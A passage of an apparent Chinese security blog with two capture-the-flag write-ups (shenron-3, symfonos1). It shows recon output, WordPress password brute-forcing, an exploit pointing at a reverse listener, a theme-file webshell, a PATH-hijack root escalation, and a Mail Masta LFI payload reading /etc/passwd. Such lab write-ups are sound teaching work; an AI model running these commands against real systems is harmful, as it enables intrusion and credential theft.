fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/27%OT=80%CT=1%CU=44458%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=6087C11A%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=</span><br><span class="line">OS:40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0</span><br><span class="line">OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R</span><br><span class="line">OS:=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.40 ms shenron.lan (192.168.4.125)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 25.59 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./shenron-3/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.125/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# gobuster dir -u http://192.168.4.125/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.125/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     txt,php,html</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/27 03:44:37 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.php (Status: 301)</span><br><span class="line">/wp-content (Status: 301)</span><br><span class="line">/license.txt (Status: 200)</span><br><span class="line">/wp-login.php (Status: 200)</span><br><span class="line">/wp-includes (Status: 301)</span><br><span class="line">/readme.html (Status: 200)</span><br><span class="line">/wp-trackback.php (Status: 200)</span><br><span class="line">/wp-admin (Status: 301)</span><br><span class="line">/wp-signup.php (Status: 302)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/27 03:47:06 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./shenron-3/2.png" alt></p>
<h3 id="发现wordpress"><a href="#发现wordpress" class="headerlink" title="发现wordpress"></a>发现wordpress</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.4.125/ --enumerate u</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# wpscan --url http://192.168.4.125/ --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.2</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.4.125/ [192.168.4.125]</span><br><span class="line">[+] Started: Tue Apr 27 04:58:23 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://192.168.4.125/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://192.168.4.125/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://192.168.4.125/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.6 identified (Insecure, released on 2016-08-16).</span><br><span class="line"> | Found By: Emoji Settings (Passive Detection)</span><br><span class="line"> |  - http://192.168.4.125/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.6'</span><br><span class="line"> | Confirmed By: Meta Generator (Passive Detection)</span><br><span class="line"> |  - http://192.168.4.125/, Match: 'WordPress 4.6'</span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;==========================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Tue Apr 27 04:58:24 2021</span><br><span class="line">[+] Requests Done: 13</span><br><span class="line">[+] Cached Requests: 39</span><br><span class="line">[+] Data Sent: 3.063 KB</span><br><span class="line">[+] Data Received: 7.142 KB</span><br><span class="line">[+] Memory used: 122.539 MB</span><br><span class="line">[+] Elapsed time: 00:00:00</span><br></pre></td></tr></table></figure>

<ul>
<li>发现<code>wordpress</code>版本为4.6</li>
</ul>
<h3 id="查找漏洞库"><a href="#查找漏洞库" class="headerlink" title="查找漏洞库"></a>查找漏洞库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit wordpress 4.6</span><br></pre></td></tr></table></figure>

<p><img data-src="./shenron-3/3.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python CVE-2016-10033.py http:&#x2F;&#x2F;192.168.4.125&#x2F; 192.168.4.75:7777 admin</span><br></pre></td></tr></table></figure>

<ul>
<li>最终并未执行成功</li>
</ul>
<h3 id="爆破admin密码"><a href="#爆破admin密码" class="headerlink" title="爆破admin密码"></a>爆破admin密码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.4.125&#x2F; -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -U admin -t 50</span><br></pre></td></tr></table></figure>

<p><img data-src="./shenron-3/4.png" alt></p>
<ul>
<li>获得账号密码<code>admin / iloverockyou</code></li>
</ul>
<h3 id="登入后台写shell"><a href="#登入后台写shell" class="headerlink" title="登入后台写shell"></a>登入后台写shell</h3><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress</a></p>
<p><img data-src="./shenron-3/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.4.125/wp-content/themes/twentyeleven/404.php</span><br></pre></td></tr></table></figure>

<p><img data-src="./shenron-3/6.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li>尝试切换<code>shenron / iloverockyou</code> 成功</li>
</ul>
<p><img data-src="./shenron-3/7.png" alt></p>
<ul>
<li>发现敏感文件</li>
</ul>
<p><img data-src="./shenron-3/8.png" alt></p>
<p><img data-src="./shenron-3/9.png" alt></p>
<ul>
<li>环境变量提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo "/bin/bash" &gt; netstat</span><br><span class="line">chmod 777 netstat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>

<p><img data-src="./shenron-3/10.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>shenron</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>shenron</tag>
      </tags>
  </entry>
  <entry>
    <title>symfonos1</title>
    <url>/2021/03/21/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos1/</url>
    <content><![CDATA[<h1 id="symfonos1"><a href="#symfonos1" class="headerlink" title="symfonos1"></a>symfonos1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>symfonos1</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    30:45:96:e4:ed:56       HUAWEI TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.43.33   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.173  00:0c:29:0b:72:a6       VMware, Inc.</span><br><span class="line">192.168.43.191  38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.102 seconds (121.79 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.173</code></li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.173</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.173</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-21 07:11 EDT</span><br><span class="line">Nmap scan report for symfonos (192.168.43.173)</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)</span><br><span class="line">|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)</span><br><span class="line">|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)</span><br><span class="line">25/tcp  open  smtp        Postfix smtpd</span><br><span class="line">|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, </span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:0B:72:A6 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host:  symfonos.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.5.16-Debian)</span><br><span class="line">|   Computer name: symfonos</span><br><span class="line">|   NetBIOS computer name: SYMFONOS\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: symfonos</span><br><span class="line">|_  System time: 2021-03-21T06:11:48-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-03-21T11:11:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.00 ms symfonos (192.168.43.173)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 22.13 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./symfonos1/1.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./symfonos1/2.png" alt></p>
<p>貌似什么都没有</p>
<ul>
<li><a href="http://192.168.43.173/manual/" target="_blank" rel="noopener">http://192.168.43.173/manual/</a></li>
</ul>
<p><img data-src="./symfonos1/3.png" alt></p>
<h3 id="Samba-smbmap"><a href="#Samba-smbmap" class="headerlink" title="Samba(smbmap)"></a>Samba(smbmap)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smbmap -H 192.168.43.173</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# smbmap -H 192.168.43.173</span><br><span class="line">[+] Guest session       IP: 192.168.43.173:445  Name: symfonos                                          </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        print$                                                  NO ACCESS       Printer Drivers</span><br><span class="line">        helios                                                  NO ACCESS       Helios personal share</span><br><span class="line">        anonymous                                               READ ONLY</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (Samba 4.5.16-Debian)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 登录 smb</span></span><br><span class="line">smbclient //192.168.43.173/anonymous  --user=symfonos</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos1/4.png" alt></p>
<ul>
<li>登录 <code>helios</code>账号</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.43.173/helios  --user=helios%qwerty</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos1/5.png" alt></p>
<ul>
<li>文件内容</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# cat research.txt </span><br><span class="line">Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.</span><br><span class="line"></span><br><span class="line">root@kali:/home/caixin# cat todo.txt </span><br><span class="line"></span><br><span class="line">1. Binge watch Dexter</span><br><span class="line">2. Dance</span><br><span class="line">3. Work on /h3l105</span><br></pre></td></tr></table></figure>

<h3 id="发现目录h3l105"><a href="#发现目录h3l105" class="headerlink" title="发现目录h3l105"></a>发现目录h3l105</h3><p><img data-src="./symfonos1/6.png" alt></p>
<ul>
<li><code>wordpress</code>框架，直接<code>wpscan</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.43.173/h3l105/</span><br></pre></td></tr></table></figure>

<p>发现重定向 <code>http://symfonos.local/h3l105/</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://symfonos.local/h3l105/</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# wpscan --url http://symfonos.local/h3l105/</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.2</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://symfonos.local/h3l105/ [192.168.43.173]</span><br><span class="line">[+] Started: Sun Mar 21 08:39:02 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.25 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://symfonos.local/h3l105/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://symfonos.local/h3l105/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://symfonos.local/h3l105/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://symfonos.local/h3l105/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://symfonos.local/h3l105/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.2&lt;/generator&gt;</span><br><span class="line"> |  - http://symfonos.local/h3l105/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.2&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentynineteen</span><br><span class="line"> | Location: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/</span><br><span class="line"> | Last Updated: 2021-03-09T00:00:00.000Z</span><br><span class="line"> | Readme: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.0</span><br><span class="line"> | Style URL: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4</span><br><span class="line"> | Style Name: Twenty Nineteen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentynineteen/</span><br><span class="line"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.4 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] mail-masta</span><br><span class="line"> | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2014-09-19T07:52:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt</span><br><span class="line"></span><br><span class="line">[+] site-editor</span><br><span class="line"> | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/</span><br><span class="line"> | Latest Version: 1.1.1 (up to date)</span><br><span class="line"> | Last Updated: 2017-05-02T23:34:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.1.1 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;===========================================================================================================&gt; (22 / 22) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Sun Mar 21 08:39:05 2021</span><br><span class="line">[+] Requests Done: 55</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 12.964 KB</span><br><span class="line">[+] Data Received: 487.745 KB</span><br><span class="line">[+] Memory used: 197.609 MB</span><br><span class="line">[+] Elapsed time: 00:00:02</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit mail masta 1.0</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos1/7.png" alt></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# cat /usr/share/exploitdb/exploits/php/webapps/40290.txt</span><br><span class="line">[+] Date: [23-8-2016]</span><br><span class="line">[+] Autor Guillermo Garcia Marcos </span><br><span class="line">[+] Vendor: https://downloads.wordpress.org/plugin/mail-masta.zip</span><br><span class="line">[+] Title: Mail Masta WP Local File Inclusion</span><br><span class="line">[+] info: Local File Inclusion </span><br><span class="line"></span><br><span class="line">The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</span><br><span class="line"></span><br><span class="line">Source: /inc/campaign/count_of_send.php</span><br><span class="line">Line 4: include($_GET['pl']);</span><br><span class="line"></span><br><span class="line">Source: /inc/lists/csvexport.php:</span><br><span class="line">Line 5: include($_GET['pl']);</span><br><span class="line"></span><br><span class="line">Source: /inc/campaign/count_of_send.php</span><br><span class="line">Line 4: include($_GET['pl']);</span><br><span class="line"></span><br><span class="line">Source: /inc/lists/csvexport.php</span><br><span class="line">Line 5: include($_GET['pl']);</span><br><span class="line"></span><br><span class="line">Source: /inc/campaign/count_of_send.php</span><br><span class="line">Line 4: include($_GET['pl']);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This looks as a perfect place to try for LFI. If an attacker is lucky enough, and instead of selecting the appropriate page from the array by its name, the script directly includes the input parameter, it is possible to include arbitrary files on the server.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Typical proof-of-concept would be to load passwd file:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试<code>POC</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos1/8.png" alt></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><ul>
<li>文件包含 + 写邮件文件(SMTP 25)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">telnet 192.168.43.173 25</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos1/9.png" alt></p>
